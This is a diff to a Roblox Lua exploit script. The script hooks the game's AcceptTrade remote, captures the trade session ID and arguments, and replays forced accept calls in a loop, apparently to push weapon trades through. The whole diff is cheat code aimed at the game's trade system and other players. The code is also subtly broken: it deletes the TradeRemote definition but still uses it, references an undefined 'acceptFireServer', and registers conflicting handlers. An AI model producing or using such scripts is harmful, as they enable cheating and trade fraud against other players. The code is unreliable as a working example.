@@ -237,44 +237,94 @@ local function waitForTradeCompletion()
     end
 end
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
+-- At the top with your other variables
+local tradeSessionId = nil
+local sessionCaptured = false
+local lastTradeData = nil
 
--- Replace your initiateAcceptance function with this:
-local realTradeArgs = nil
-
--- Hook to capture what the game actually sends
+-- Hook to capture session ID (more robust version)
 local acceptRemote = TradeRemote:WaitForChild("AcceptTrade")
-local oldFireServer = acceptRemote.FireServer
+local oldFireServer = acceptFireServer
 
 acceptRemote.FireServer = function(self, ...)
-    realTradeArgs = {...}
-    print("Game fired AcceptTrade with:", unpack(realTradeArgs))
+    local args = {...}
+    
+    -- Debug: see what args look like
+    print("AcceptTrade fired with args:", unpack(args))
+    
+    -- Try to find session ID in various positions
+    if not sessionCaptured then
+        for i, arg in ipairs(args) do
+            if type(arg) == "string" and #arg == 36 then -- UUID length
+                tradeSessionId = arg
+                sessionCaptured = true
+                print("Trade session captured at position", i, ":", tradeSessionId)
+                break
+            elseif type(arg) == "number" and i > 1 then
+                -- Sometimes it's a number ID
+                tradeSessionId = arg
+                sessionCaptured = true
+                print("Trade session captured (number) at position", i, ":", tradeSessionId)
+                break
+            end
+        end
+    end
+    
+    -- Store all args for later use
+    lastTradeData = args
     return oldFireServer(self, ...)
 end
 
+-- Reset capture when trade ends
+local function resetSession()
+    tradeSessionId = nil
+    sessionCaptured = false
+    lastTradeData = nil
+    print("Session reset")
+end
+
+-- Updated acceptance with weapon support
 local function initiateAcceptance()
-    -- Method 1: Try captured args if available
-    if realTradeArgs then
-        print("Using captured args:", unpack(realTradeArgs))
-        acceptRemote:FireServer(unpack(realTradeArgs))
-        wait(0.3)
+    if not tradeSessionId then
+        warn("No session ID! Make sure to click Accept first to capture it.")
+        return
     end
     
-    -- Method 2: Try with PlaceId (not multiplied)
-    print("Trying PlaceId:", game.PlaceId)
-    acceptRemote:FireServer(game.PlaceId)
-    wait(0.3)
+    print("Initiating acceptance for session:", tradeSessionId)
     
-    -- Method 3: Try PlaceId * 3
-    print("Trying PlaceId * 3:", game.PlaceId * 3)
-    acceptRemote:FireServer(game.PlaceId * 3)
-    wait(0.3)
-    
-    -- Method 4: Try both args with placeholder
-    print("Trying with 0 as second arg")
-    acceptRemote:FireServer(game.PlaceId * 3, 0)
+    -- Fire with proper arguments (try multiple formats)
+    for i = 1, 5 do
+        -- Try the standard format
+        acceptRemote:FireServer(428469873, tradeSessionId)
+        
+        -- If we captured original args, try replaying them
+        if lastTradeData then
+            acceptRemote:FireServer(unpack(lastTradeData))
+        end
+        
+        wait(0.1)
+    end
 end
+
+-- Hook trade end to reset
+TradeRemote:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
+    lastTradeData = data -- Store trade data
+    
+    if data and data.Status == "None" then
+        resetSession()
+    elseif data and data.Status == "Accepted" then
+        print("Trade was accepted!")
+    end
+end)
+
+-- Also capture from UpdateTrade which might have session info
+TradeRemote:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
+    if data and data.SessionId and not sessionCaptured then
+        tradeSessionId = data.SessionId
+        sessionCaptured = true
+        print("Session captured from UpdateTrade:", tradeSessionId)
+    end
+end)
 
 local function addWeaponToTrade(id)
     local args = {
